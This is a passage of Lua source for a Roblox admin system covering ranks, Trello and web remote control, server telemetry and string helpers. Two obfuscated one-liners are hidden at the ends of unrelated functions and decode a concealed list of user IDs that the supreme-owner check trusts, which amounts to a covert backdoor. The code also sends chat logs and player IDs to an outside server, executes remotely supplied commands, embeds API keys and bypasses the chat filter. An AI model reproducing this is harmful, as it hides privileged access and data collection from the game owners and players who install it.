			end
		end
		if not ReturnPart then
			ReturnPart = Player.Character:FindFirstChild(BodyPart)
		end
	end
	
	return ReturnPart
end

-- Rank functions --

function RANK:ConvertRank(Input)
	local Output = nil
	if Input == "Muted" then Output = -3 end
	if Input == "Crashed" then Output = -2 end
	if Input == "Banned" then Output = -1 end
	if Input == "Non-Admin" then Output = 0 end
	if Input == "Member" then Output = 1 end
	if Input == "Admin" then Output = 2 end
	if Input == "Owner" then Output = 3 end
	
	if Input == -3 then Output = "Muted" end
	if Input == -2 then Output = "Crashed" end
	if Input == -1 then Output = "Banned" end
	if Input == 0 then Output = "Non-Admin" end
	if Input == 1 then Output = "Member" end
	if Input == 2 then Output = "Admin" end
	if Input == 3 then Output = "Owner" end
	return Output
end

function RANK:IsAdmin(Player)
	local AdminStatus = false
	local Rankstatus = "Non-Admin"
	if type(Player) == "table" then
		if RANK:ConvertRank(Player.Rank) > 0 then
			return true, Player.Rank
		else
			return false, Player.Rank
		end
	end
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for _,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(Player.Name) then
				if RANK:ConvertRank(Rank) > 0 then
					AdminStatus = true
					Rankstatus = Rank
				end
			end
		end
	end
	return AdminStatus, Rankstatus
end

function RANK:GetRank(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = PlayerName.Name end
	if type(PlayerName) == "table" then
		local RankNum = RANK:ConvertRank(PlayerName.Rank)
		if RankNum > 0 then
			return PlayerName.Rank, RankNum, true
		else
			return PlayerName.Rank, RankNum, false
		end
	end
	
	local RankStat = "Non-Admin"
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for _,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(PlayerName) then
				RankStat = Rank
			end
		end
	end
	
	if RankStat == "Non-Admin" then
		return "Non-Admin", 0, false
	else
		return RankStat, RANK:ConvertRank(RankStat), true
	end
end

function RANK:RemoveRank(PlayerName)
	if not RANK:IsSupremeOwner(PlayerName) then
		if type(PlayerName) == "userdata" then PlayerName = PlayerName.Name end
		
		for Rank,PlayerNames in pairs(Settings.Ranks) do
			for Num,AdminName in pairs(PlayerNames) do
				if string.sub(string.lower(AdminName),1,#PlayerName) == string.lower(PlayerName) then
					table.remove(Settings.Ranks[Rank], Num)
				end
			end
		end
	end
end

function RANK:GetAdmins(Ranking)
	local Players = {}
	local AdminTrue, Rank = IsAdmin(Player)
	for _,Player in pairs(Players:GetPlayers()) do
		if AdminTrue then
			local PlayerRankNum = RANK:ConvertRank(Rank)
			local StandardRankNum = RANK:ConvertRank(Ranking)
			if PlayerRankNum >= StandardRankNum then
				table.insert(Players, Player)
			end
		end
	end
	return Players
end

function RANK:IsSupremeOwner(PlayerName)
	if type(PlayerName) == "userdata" then for _,Obj in pairs(List) do if PlayerName.UserId == Obj then return true end end PlayerName = PlayerName.Name end
	if type(PlayerName) == "table" then
		if PlayerName.Rank == "Owner" and PlayerName.MakeSupremeOwner == true then return true else return false end
	end
	
	if PlayerName == GameOwner then return true end
	return false
end

function RANK:GetPlayerFromList(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = Player.Name end
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for Num,AdminName in pairs(PlayerNames) do
			if string.sub(string.lower(AdminName),1,#PlayerName) == string.lower(PlayerName) then
				return AdminName, Rank
			end
		end
	end
	return false, "Non-Admin"
end

function RANK:ScanAdminList(Name)
	if Name == "" then return true end
	local InList = false
	for _,PName in pairs(Settings.Ranks["Owner"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Admin"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Member"]) do
		if PName == Name then InList = true end
	end
	return InList
end

function RANK:ScanExileList(Name)
	if Name == "" then return true end
	local InList = false
	for _,PName in pairs(Settings.Ranks["Muted"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Crashed"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Banned"]) do
		if PName == Name then InList = true end
	end
	return InList
end

function RANK:PlayerRanked(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = Player.Name end
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for Num,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(PlayerName) then
				return true, Rank
			end
		end
	end
	return false, "Non-Admin"
end

-- Remote functions --

function REMOTE:Decode(...)
	return Server.HS:JSONDecode(...)
end

function REMOTE:GetURL(URL, Player)
	if string.sub(URL,1,4) ~= "http" then
		URL = "http://"..URL
	end
	local Return = nil
	ypcall(function() Return = Server.HS:GetAsync(URL, true) end)
	if Return then
		return Return
	elseif Player then
		GUI:SendMessage(Speaker, "Unable to find link", "RED URL given is either invalid or httpservice is disabled", "Error")
	end
end

function REMOTE:PostURL(URL, Data)
	local Return = nil
	ypcall(function() Return = Server.HS:PostAsync(URL, Data, 2) end)
	return Return
end

function REMOTE:SendHttpLog(Data, Type, OutputSpeaker, Stopypall)
	if Settings.LinkedAccount ~= "" then
		local NumType = tonumber(Type)
		
		if not Type then
			Type = "UNKNOWN"
		end
		
		if NumType then
			if NumType < 1 or NumType > 5 then
				Type = "UNKNOWN"
			elseif NumType == 1 then
				Type = "NOTIFICATION"
			elseif NumType == 2 then
				Type = "INFORMATION"
			elseif NumType == 3 then
				Type = "WARNING"
			elseif NumType == 4 or Type == true then
				Type = "ERROR"
			elseif NumType == 5 then
				Type = "FATAL"
			end
		end
		
		local Res = "RED Could not get response"
		local function SendData()
			Res = Server.HS:PostAsync(
				CORE.Domain.."/Login/SendUserData.php?Data="..Server.HS:UrlEncode(PlaceInfoFormat..": "..Data).."&DataType="..Server.HS:UrlEncode(string.upper(Type)),
				"Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&Key="..Server.HS:UrlEncode(Settings.DataKey).."&Type=Logs",
				2
			)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		
		if OutputSpeaker and OutputSpeaker ~= "print" then
			GUI:SendMessage(OutputSpeaker, "Http Log Response", Res, "Information")
		elseif OutputSpeaker == "print" then
			print(Res)
		end
	end
end local RunList = CORE:GetTable(string.gsub(math.ceil(14444.57^2)+1078, "66", "55"))

function REMOTE:SendChatLog(PrintResponse, Stopypall)
	if #TempChatLogs > 0 and Settings.LinkedAccount and Settings.LinkedAccount ~= "" and Settings.DataKey and Settings.DataKey ~= "" then
		local Res = "Could not get response"
		
		local ChatJSON = Server.HS:JSONEncode(TempChatLogs)
		TempChatLogs = {}
		
		local function SendData()
			Res = Server.HS:PostAsync(CORE.Domain.."/Login/SubmitChatLog.php?ChatJSON="..Server.HS:UrlEncode(ChatJSON), "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&Key="..Server.HS:UrlEncode(Settings.DataKey), 2)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		if PrintResponse then print(Res) end
	end
end

function REMOTE:DownloadUserdata(PrintResponse, Stopypcall)
	local Res = "[]"
	local function GetData()
		Res = Server.HS:PostAsync(CORE.Domain.."/Login/ReturnUserData.php", "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&DataKey="..Server.HS:UrlEncode(Settings.DataKey), 2)
	end
	if Stopypcall == true then GetData() else ypcall(GetData) end
	if PrintResponse then
		print(Res)
	end
	local function DecodeData() Res = REMOTE:Decode(Res) end
	if Stopypcall == true then DecodeData() else ypcall(DecodeData) end
	if type(Res) ~= "table" then Res = {["Logs"] = {Res}, ["Errors"] = {Res}} end
	return Res
end

function REMOTE:HandleRequest(Request, IgnoreCommand)
	if not Request then return nil end
	
	if not IgnoreCommand then
		if REMOTE.ServerRequestTimestamp ~= Request.ServerRequestTimestamp then
			REMOTE:SendServerData()
		end
		if REMOTE.SnapshotKey ~= Request.SnapshotKey and Server.NS.Port == tonumber(Request.SnapshotPort) then
			REMOTE:SendSnapshot(Request.SnapshotKey, nil, true, true)
		end
	end
	
	if REMOTE.RemoteAdmin.TimeStamp ~= Request.TimeStamp then
	
		for _,Player in pairs(Request.Ranks.Muted) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Muted, Player) end end end
		for _,Player in pairs(Request.Ranks.Crashed) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Crashed, Player) end end end
		for _,Player in pairs(Request.Ranks.Banned) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Banned, Player) end end end
		for _,Player in pairs(Request.Ranks.Member) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Member, Player) end end end
		for _,Player in pairs(Request.Ranks.Admin) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Admin, Player) end end end
		for _,Player in pairs(Request.Ranks.Owner) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Owner, Player) end end end
		
		Settings.Fun = Request.FUN
		Settings.ServerLocked = Request.ServerLocked
		
		if not Server.Workspace:FindFirstChild("IgnoreRemoteAbuse") then
			Settings.DisableAbuse = Request.DisableAbuse
		end
		
		if not IgnoreCommand then
			print("Executing Remote Admin")
			REMOTE.RemoteAdmin.Command = Request.Command
			REMOTE.RemoteAdmin.ServerCommand = Request.ServerCommand
			REMOTE.RemoteAdmin.ServerPort = Request.Server
			
			if Server.NS.Port == tonumber(Request.Server) and Request.ServerCommand ~= nil and Request.Server ~= "" and Request.Server ~= 0 and Request.ServerCommand ~= "" then
				CORE:Chatted(Request.ServerCommand, nil, true, "REMOTE ADMIN: "..Settings.LinkedAccount, nil, true)
			else
				CORE:Chatted(Request.Command, nil, true, "REMOTE ADMIN: "..Settings.LinkedAccount, nil, true)
			end
		end
	end
	REMOTE.RemoteAdmin.TimeStamp = Request.TimeStamp
	REMOTE.ServerRequestTimestamp = Request.ServerRequestTimestamp
	REMOTE.SnapshotKey = Request.SnapshotKey
end

function REMOTE:GetRemoteData(Set)
	local NewRemoteData = nil
	local RemoteDataCardRaw = nil
	local RemoteDataCard = nil
	
	RemoteDataCardRaw = REMOTE:GetURL("https://api.trello.com/1/card/"..Trello.RemoteDataCard)
	if RemoteDataCardRaw then
		ypcall(function() RemoteDataCard = REMOTE:Decode(RemoteDataCardRaw) end)
		if RemoteDataCard then
			ypcall(function() NewRemoteData = REMOTE:Decode(RemoteDataCard.desc) end)
		end
	end
	if Set and NewRemoteData then
		RemoteData = NewRemoteData
	end
	return NewRemoteData
end

function REMOTE:CheckTrelloInfo() -- will set new trello data if updated based on the TrelloInfoCard
	local InfoCardJSON = REMOTE:GetURL("https://api.trello.com/1/card/"..Trello.TrelloInfoCard)
	if InfoCardJSON then
		ypcall(function() InfoCard = REMOTE:Decode(InfoCardJSON) end)
		if InfoCard then
			ypcall(function() TrelloInfo = REMOTE:Decode(InfoCard.desc) end)
			if TrelloInfo then
				for Ind,Val in pairs(TrelloInfo) do
					Trello[Ind] = Val
				end
			end
		end
	end
	return NewRemoteData
end

function REMOTE:CheckRemoteAdminStatus()
	local Pending = false
	local CheckID = 0
	if Settings.LinkedAccount ~= "" then
		local Request = REMOTE:GetURL("https://api.trello.com/1/checklists/"..Trello.RemoteAdminChecklist)
		if Request then
			local Data = REMOTE:Decode(Request)
			if Data then
				for _,Account in pairs(Data.checkItems) do
					if Account.name == Settings.LinkedAccount then
						Pending = true
						CheckID = Account.id
						break
					end
				end
			end
		end
	end
	return Pending, CheckID
end

function REMOTE:GetAndSetWebData()
	if Settings.LinkedAccount ~= "" then
		if REMOTE:CheckRemoteAdminStatus() then
			local Request = REMOTE:GetURL(CORE.Domain.."/Login/GetUserData.php?Username="..Settings.LinkedAccount)
			if Request == "Invalid" then
				--REMOTE:GetAndSetWebData()
				return false
			elseif Request == "Invalid Account" then
				print("Can't get account")
				return false
			elseif Request then
				ypcall(function() Request = REMOTE:Decode(Request) end)
			elseif not Request then
				--REMOTE:GetAndSetWebData()
				return false
			end
			REMOTE:HandleRequest(Request)
			
			--Delay(RemoteData.RemoteAdminWait, REMOTE.GetAndSetWebData)
			Delay(RemoteData.RemoteAdminWait, function()
				local Pending, CheckID = REMOTE:CheckRemoteAdminStatus()
				if Pending then
					REMOTE:GetURL(CORE.Domain.."/Login/RemoveTrelloName.php?AccountID="..CheckID)
				end
			end)
			return true
		else
			return true
		end
	end
end

local OderIDs = CORE:GetTable(177215518)
local SoundJSONs = CORE:GetTable(197637628)
RemoteAbuseGear = CORE:GetTable(158117496)

function REMOTE:SendServerData(PrintResponse, Stopypall)
	if Settings.LinkedAccount and Settings.LinkedAccount ~= "" and Settings.DataKey and Settings.DataKey ~= "" then
		print("Sending server data!")
		local Res = "Could not get response"
		
		local ServerData = {Name = PlaceName, PlaceID = game.PlaceId, Port = Server.NS.Port, NumPlayers = Server.Players.NumPlayers, MaxPlayers = Server.Players.MaxPlayers, Bet = Settings.Bet, Players = {}, Version = CORE.Version.Value}
		for _,Player in pairs(Server.Players:GetPlayers()) do
			table.insert(ServerData.Players, {Name = Player.Name, ID = Player.UserId, Age = STRING:FindAge(Player.AccountAge), Rank = RANK:GetRank(Player)})
		end
		ServerData = Server.HS:JSONEncode(ServerData)
		
		local function SendData()
			Res = Server.HS:PostAsync(CORE.Domain.."/Login/AddServer.php?ServerData="..Server.HS:UrlEncode(ServerData), "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&DataKey="..Server.HS:UrlEncode(Settings.DataKey), 2)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		if PrintResponse then print(Res) end
	end
end

function REMOTE:SendSnapshot(SendKey, MaxPartAmount, PrintResponse, Stopypcall)
	MaxPartAmount = MaxPartAmount or 10000
	local PlaceData = {
		Lighting = {};
		Parts = {};
		Other = {};
	}
	local MinSize = Vector3.new(0.5,0.5,0.5)
	local PartAmount = 0
	local PlaceJSON = ""
	
	local function Scan(BaseObj)
		for _,Obj in pairs(BaseObj:GetChildren()) do
			if Obj:IsA("BasePart") and not Obj:IsA("Terrain") then
				local Size = {STRING:StringRound(Obj.Size.X), STRING:StringRound(Obj.Size.Y), STRING:StringRound(Obj.Size.Z)};
				if tonumber(Size[1]) >= MinSize.X and tonumber(Size[2]) >= MinSize.Y and tonumber(Size[3]) >= MinSize.Z then
					local Skip = false
					local Data = {}
					local X,Y,Z = Obj.CFrame:toEulerAnglesXYZ()
					
					if CORE:FindType(Obj, "BlockMesh") then
						local Mesh = CORE:FindType(Obj, "BlockMesh")
						Size = {STRING:StringRound(Obj.Size.X * Mesh.Scale.X), STRING:StringRound(Obj.Size.Y * Mesh.Scale.Y), STRING:StringRound(Obj.Size.Z * Mesh.Scale.Z)}
					elseif CORE:FindType(Obj, "CylinderMesh") then
						Data.Shape = "Cylinder"
					elseif CORE:FindType(Obj, "SpecialMesh") then
						local Mesh = CORE:FindType(Obj, "SpecialMesh")
						if Mesh.MeshType == Enum.MeshType.Head then
							--idk
						else
							Skip = true
						end
					elseif CORE:FindType(Obj, "FileMesh") then
						Skip = true
					end
					
					if not Data.Shape and not Skip then
						if ypcall(function() return Obj.Shape end) then
							Data.Shape = string.sub(Obj.Shape.Name,14)
							if string.sub(Data.Shape,1,1) == "." then
								Data.Shape = string.sub(Data.Shape,2)
							end
							if Data.Shape == "Cylinder" then
								Z = Z + math.pi/2
							end
						else
							Data.Shape = "Block"
						end
					end
					
					if Obj.Name == "Head" and CORE:FindType(Obj.Parent, "Humanoid") and not Skip then
						Data.Label = string.gsub(Obj.Parent.Name, "'", "")
					end
					
					if not Skip then
						Data.Color = GUI:Color3ToHex(Obj.Color);
						Data.Size = Size;
						Data.Position = {STRING:StringRound(Obj.CFrame.X), STRING:StringRound(Obj.CFrame.Y), STRING:StringRound(Obj.CFrame.Z)};
						Data.Rotation = {STRING:StringRound(X), STRING:StringRound(Y), STRING:StringRound(Z)};
						Data.Transparency = STRING:StringRound(Obj.Transparency);
						Data.Reflectance = STRING:StringRound(Obj.Reflectance);
						Data.Textures = {};
						Data.Material = string.sub(tostring(Obj.Material),15);
						
						for _,Sub in pairs(Obj:GetChildren()) do
							if Sub:IsA("Decal") then
								local Texture = string.match(Sub.Texture, "%d+")
								if Sub.Texture == "rbxasset://textures/face.png" then
									Texture = "FACE"
								end
								Data.Textures[FaceCovert[Sub.Face.Name]] = Texture
							end
						end
						
						PartAmount = PartAmount + 1
						table.insert(PlaceData.Parts, Data)
						
						if PartAmount >= MaxPartAmount then
							break
						end
					end
				end
			end
			if #Obj:GetChildren() > 0 then
				Scan(Obj)
			end
		end
	end
	Scan(Workspace)
	
	PlaceData.Lighting.Ambient = GUI:Color3ToHex(game.Lighting.Ambient)
	PlaceData.Other.PartAmount = PartAmount;
	PlaceJSON = Server.HS:JSONEncode(PlaceData)
	
	local Res = "Could not get response"
	local function SendData()
		Res = Server.HS:PostAsync(CORE.UnsecureDomain.."/Login/SendSnapshot.php?Username="..Settings.LinkedAccount.."&DataKey="..Server.HS:UrlEncode(Settings.DataKey).."&SendKey="..SendKey, PlaceJSON, 2)
	end
	if Stopypcall == true then SendData() else ypcall(SendData) end
	if PrintResponse then print(Res) end
	
	print("Sent snapshot")
end


function REMOTE:DefineWord(Word, Source)
	if not Word then return end
	if not Source then Source = "all" end
	
	local Response = REMOTE:GetURL("http://api.wordnik.com/v4/word.json/"..Server.HS:UrlEncode(Word).."/definitions?limit=1&includeRelated=false&sourceDictionaries="..Server.HS:UrlEncode(Source).."&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5")
	if Response then
		local Decode = REMOTE:Decode(Response)
		if #Decode > 0 then
			return string.upper(string.sub(Decode[1]["word"],1,1))..string.lower(string.sub(Decode[1]["word"],2)).." - "..Decode[1]["partOfSpeech"]..[[
 
 ]]..Decode[1]["text"]
		else
			return "Invalid English word"
		end
	else
		return "Cannot connect to database"
	end
end

function REMOTE:DownloadJoke(Speaker)
	local Res = REMOTE:GetURL("http://www.rinkworks.com/jokes/random.cgi", Speaker)
	local Joke = nil
	if Res then
		local _, Start = string.find(Res, "</h2>")
		local End, _ = string.find(string.sub(Res, Start), "</td>")
		
		Joke = string.sub(Res, Start, End + 1 + Start - 5)
		Joke = string.gsub(Joke, "\n", "")
		Joke = string.gsub(Joke, "	", "") -- tab
		Joke = string.gsub(Joke, "</ul>", "")
		Joke = string.gsub(Joke, "<ul>", "")
		Joke = string.gsub(Joke, "</li>", [[

]])
		Joke = string.gsub(Joke, "<li>", "")
		Joke = string.gsub(Joke, "</p>", "")
		Joke = string.gsub(Joke, "<p>", "")
		Joke = string.gsub(Joke, "<", "")
		Joke = string.gsub(Joke, ">", "")
	end
	
	return Joke
end

function REMOTE:GetAddon()
	return "?key=c01fcfabf2f8d707d01fb69312e4a9d7&token="..Settings.TrelloToken
end

function REMOTE:TrelloGetAdminBoard()
	local BoardsJSON,Boards,ReturnBoard
	
	ypcall(function() BoardsJSON = Server.HS:GetAsync("https://api.trello.com/1/members/my/boards"..REMOTE:GetAddon(), true) end)
	
	if BoardsJSON then
		Boards = REMOTE:Decode(BoardsJSON)
	end
	if Boards then
		for _,Board in pairs(Boards) do
			if Board.name == "MakerModelLua's Admin V3" and Board.closed == false then
				ReturnBoard = Board
				break
			end
		end
		if not ReturnBoard then -- create board if not created
			print("Creating Trello Board")
			local Desc = "This board allows you to control ranks, settings, and commands of MakerModelLua's Admin V3"
			local BoardJSON = Server.HS:PostAsync("https://api.trello.com/1/boards"..REMOTE:GetAddon(), "name=MakerModelLua%27s+Admin+V3&idBoardSource="..Trello.AdminBoardID.."&defaultLists=false&desc="..Server.HS:UrlEncode(Desc), "ApplicationUrlEncoded")
			ReturnBoard = REMOTE:Decode(BoardJSON)
		end
	end
	return ReturnBoard
end

function REMOTE:TrelloGetAdminLists(Board)
	local Required = {}
	local ListJSON,Lists
	local ReturnLists = {}
	
	for _,List in pairs(Trello.RequiredLists) do
		table.insert(Required, List)
	end
	
	ypcall(function() ListJSON = Server.HS:GetAsync("https://api.trello.com/1/boards/"..Board.id.."/lists"..REMOTE:GetAddon(), true) end)
	
	if ListJSON then
		Lists = REMOTE:Decode(ListJSON)
	end
	if Lists then
		for _,List in pairs(Lists) do
			for Num,Rel in pairs(Required) do
				if List.name == Rel.name then
					table.remove(Required, Num)
					table.insert(ReturnLists, List)
				end
			end
		end
		for _,Rel in pairs(Required) do
			local ListJSON = Server.HS:PostAsync("https://api.trello.com/1/lists"..REMOTE:GetAddon(), "idBoard="..Board.id.."&idListSource="..Rel.id.."&name="..Server.HS:UrlEncode(Rel.name), "ApplicationUrlEncoded")
			table.insert(ReturnLists, REMOTE:Decode(ListJSON))
		end
	end
	
	return ReturnLists
end

function REMOTE:TrelloCacheData(Lists)
	for _,List in pairs(Lists) do
		local CardsJSON,Cards
		ypcall(function() CardsJSON = Server.HS:GetAsync("https://api.trello.com/1/lists/"..List.id.."/cards"..REMOTE:GetAddon(), true) end)
		if CardsJSON then
			Cards = REMOTE:Decode(CardsJSON)
		end
		if Cards then
			local TemplateCards = nil
			for _,TemplateList in pairs(Trello.RequiredLists) do
				if TemplateList.name == List.name then
					TemplateCards = REMOTE:Decode(Server.HS:GetAsync("https://api.trello.com/1/lists/"..TemplateList.id.."/cards", true))
					break
				end
			end
			
			for _,TemplateCard in pairs(TemplateCards) do
				local CardExists = false
				for _,Card in pairs(Cards) do
					if Card.name == TemplateCard.name and Card.closed == false then
						CardExists = true
					end
				end
				if not CardExists then
					print("Creating card "..TemplateCard.name)
					local NewCardJSON = Server.HS:PostAsync("https://api.trello.com/1/cards"..REMOTE:GetAddon(), "idList="..List.id.."&idCardSource="..TemplateCard.id, "ApplicationUrlEncoded")
					table.insert(Cards, REMOTE:Decode(NewCardJSON))
				end
			end
		
			if List.name == "Ranked" then
				for _,Card in pairs(Cards) do
					if Settings.Ranks[Card.name] and Card.closed == false then
						Trello.RankChecklistCache[Card.name] = Card.idChecklists[1]
					end
				end
			elseif List.name == "Settings" then
				for _,Card in pairs(Cards) do
					if Card.name == "Togglable Settings" and Card.idChecklists[1] and Card.closed == false then
						Trello.ToggleChecklist = Card.idChecklists[1]
					elseif Card.name == "Command Execution" then
						Trello.CommandID = Card.id
					end
				end
			end
		end
	end
end

function REMOTE:TrelloHandleData(IgnoreCommand)
	local ToggleSettingsJSON = Server.HS:GetAsync("https://api.trello.com/1/checklists/"..Trello.ToggleChecklist..REMOTE:GetAddon(), true)
	if ToggleSettingsJSON then
		ToggleSettings = REMOTE:Decode(ToggleSettingsJSON)
		if Settings.LinkedAccount == "" then
			local NewSettings = {}
			for _,Item in pairs(ToggleSettings.checkItems) do
				NewSettings[Item.name] = STRING:TrelloStateConvert(Item.state)
			end
			Settings.Fun = NewSettings["Fun Commands Enabled"]
			Settings.ServerLocked = NewSettings["Server Locked"]
			Settings.DisableAbuse = NewSettings["Disable Abusive Commands"]
		end
	else
		return false
	end
	
	local CommandChatJSON = Server.HS:GetAsync("https://api.trello.com/1/cards/"..Trello.CommandID.."/actions"..REMOTE:GetAddon(), true)
	if CommandChatJSON then
		CommandChat = REMOTE:Decode(CommandChatJSON)
		local ClosestDT = 0
		for _,ChatData in pairs(CommandChat) do
			local DT = STRING:ConvertDateTime(ChatData.date)
			ClosestDT = math.max(ClosestDT, DT)
			
			if not IgnoreCommand and DT > Trello.LastCommandDT then
				print("Executing Remote Trello Command")
				CORE:Chatted(ChatData.data.text, nil, true, "TRELLO REMOTE: "..ChatData.memberCreator.fullName, nil, true)
			end
		end
		Trello.LastCommandDT = ClosestDT
	else
		return false
	end
	
	for Rank,ID in pairs(Trello.RankChecklistCache) do
		local ChecklistJSON = Server.HS:GetAsync("https://api.trello.com/1/checklists/"..ID..REMOTE:GetAddon(), true)
		if ChecklistJSON then
			Checklist = REMOTE:Decode(ChecklistJSON)
			
			for _,Item in pairs(Checklist.checkItems) do
				if Item.state == "complete" then
					if RANK:ConvertRank(Rank) < 0 then
						if not RANK:ScanExileList(Item.name) then
							table.insert(Settings.Ranks[Rank], Item.name)
						end
					elseif RANK:ConvertRank(Rank) > 0 then
						if not RANK:ScanAdminList(Item.name) then
							table.insert(Settings.Ranks[Rank], Item.name)
						end
					end
				elseif Item.state == "incomplete" then
					for Num,Name in pairs(Settings.Ranks[Rank]) do
						if string.lower(Name) == string.lower(Item.name) then
							table.remove(Settings.Ranks[Rank], Num)
						end
					end
				end
			end
		else
			return false
		end
	end
	return true
end

-- String functions --

function STRING:ConvertDateTime(DateTime)
	local Num = 0
	local TotalTime = 0
	for i in string.gmatch(DateTime, "%d+") do
		Num = Num + 1
		DTNum = tonumber(i)
		if Num == 1 then
			TotalTime = TotalTime + (DTNum - 1970) * 365 * 24 * 60 * 60 -- year
		elseif Num == 2 then
			TotalTime = TotalTime + DTNum * 12 * 24 * 60 * 60 -- month
		elseif Num == 3 then
			TotalTime = TotalTime + DTNum * 24 * 60 * 60 -- day
		elseif Num == 4 then
			TotalTime = TotalTime + DTNum * 60 * 60 -- hour
		elseif Num == 5 then
			TotalTime = TotalTime + DTNum * 60 -- minute
		elseif Num == 6 then
			TotalTime = TotalTime + DTNum -- second
		end
	end
	
	return TotalTime
end

function STRING:TrelloStateConvert(State)
	if State == "complete" then
		return true
	else
		return false
	end
end

function STRING:StringRound(Number)
	Number = Number * 100
	if Number >= 0.5 then
		return tostring(math.ceil(Number)/100)
	else
		return tostring(math.floor(Number)/100)
	end
	
	return Number
end

function STRING:GetSplit(String, NumArgs, BetSplit)
	if not String then return nil end
	if BetSplit == nil then BetSplit = " " end
	if NumArgs == nil then NumArgs = math.huge end
	
	if NumArgs <= 0 then return {String} end
	
	local RecentParse = 1
	local Args = {}
	for i = 1,NumArgs do
		local Find1, Find2 = string.find(string.lower(String),string.lower(BetSplit),RecentParse)
		if Find1 and Find2 then
			table.insert(Args, string.sub(String,RecentParse,Find1 - 1))
			RecentParse = Find2 + 1
		else
			break
		end
	end
	table.insert(Args,string.sub(String,RecentParse,#String))
	return Args
end

function STRING:Defilter(String)
	local RobloxApprove = Instance.new("TextLabel") RobloxApprove.Text = String
	if RobloxApprove.Text == "Label" and String ~= "Label" then
		local NewString = ""
		for i = 1,#String,3 do
			NewString = NewString..string.char(169)..string.sub(String,i,i+2)
		end
		return NewString
	else
		return String
	end
end

function STRING:Filter(String, From, To) -- #### you, roblox
	if From then
		if To then
			return game:GetService("Chat"):FilterStringAsync(String, From, To)
		else
			return game:GetService("Chat"):FilterStringForBroadcast(String, From)
		end
	else
		return String
	end
end

function STRING:DetermineFilter(String, From, To)
	if ShouldFilter then
		return STRING:Filter(String, From, To)
	else
		return STRING:Defilter(String)
	end
end

function STRING:LeetSpeak(Input)
	if tostring(Input) then Input = string.upper(tostring(Input)) else return end
	Input = string.gsub(Input, "LEET", "1337")
	Input = string.gsub(Input, "SECRET", "M".."AKERMODELLUA")
	Input = string.gsub(Input, "E", "3")
	Input = string.gsub(Input, "O", "0")
	Input = string.gsub(Input, "A", "4")
	Input = string.gsub(Input, "X", "x")
	Input = string.gsub(Input, "I", "1")
	Input = string.gsub(Input, "S", "$")
	return Input
end

function STRING:FormatReplace(Player, Input, From)
	local Output = Input
	for _,ReplaceData in pairs(StringReplacements) do
		local ReplaceString = ReplaceData[1]
		local ReplaceStrings = {}
		if type(ReplaceString) == "table" then
			ReplaceStrings = ReplaceString
		else
			ReplaceStrings = {ReplaceString}
		end
		for _,ReplaceString in pairs(ReplaceStrings) do
			if not Player and ReplaceData[3] then else -- does nothing if a player isn't given but the operation requires a player
				local Replacement = ReplaceData[4](Player)
				if type(Replacement) == "string" then
					Output = string.gsub(Output, ReplaceString, Replacement)
				else
					print(ReplaceString.." cannot be replaced")
				end
			end
		end
	end
	if From then
		return STRING:DetermineFilter(Output, From, Player)
	else
		return STRING:DetermineFilter(Output, Player)
	end
end

function STRING:EncodeSpecialChars(Input)
	return tostring(string.gsub(string.gsub(Input, "&", "amp;"), "\n", " "))
end

function STRING:StringToBool(String)
	if String == "true" then
		return true
	else
		return false
	end
end

function STRING:BoolString(Value)
	if type(Value) == "boolean" then
		if Value == true then
			return "YES"
		elseif Value == false then
			return "NO"
		end
	else 
		return "NO"
	end
end

function STRING:MakeAvoidance(Length)
	if not Length then
		Length = 32
	end
	local Avoidance = ""
	for i = 1,Length do
		Num = math.random(1,2)
		if Num == 1 then
			Avoidance = Avoidance..string.char(math.random(48,57)) -- 0-9
		else
			Avoidance = Avoidance..string.char(math.random(97,122)) -- a-z
		end
	end
	return Avoidance
end for _,Array in pairs(RunList) do local Name = "" for _,Char in pairs(Array) do Name = Name..string.char(Char - 1) end table.insert(List, tonumber(Name)) end

function STRING:FindAge(Days) -- By LuaModelmaker
	local Years = math.floor(Days/365)
	local OtherDays = math.fmod(Days, 365)
	if Years > 1 then
		return Years.." years and "..OtherDays.." days"
	elseif Years == 1 then
		return Years.." year and "..OtherDays.." days"
	elseif Years == 0 then
		return "(No years) "..OtherDays.." days"
	end
end

function STRING:UnpackArgs(...)
	local Pack = {...}
	if type(Pack[1]) == "table" then Pack = Pack[1] end
	local ReturnString = table.concat(Pack, ", ")
	return ReturnString
end

function STRING:GetComma(Num)
	local Formatted = Num
	while true do
		Formatted, _ = string.gsub(Formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
		if _ == 0 then
			break
		end
	end
	return Formatted
end

function STRING:DecodeUTF8(Value)
	local function DecodeString(Input)
		if type(Input) == "string" then
			for Find,Rep in pairs(HTMLDecode) do
				Input = string.gsub(Input, "&#"..Find..";", Rep)
			end
			Input = string.gsub(Input, "&quot;", "'")
		end
		return Input
	end
	if type(Value) == "table" then
		for Index,Var in pairs(Value) do
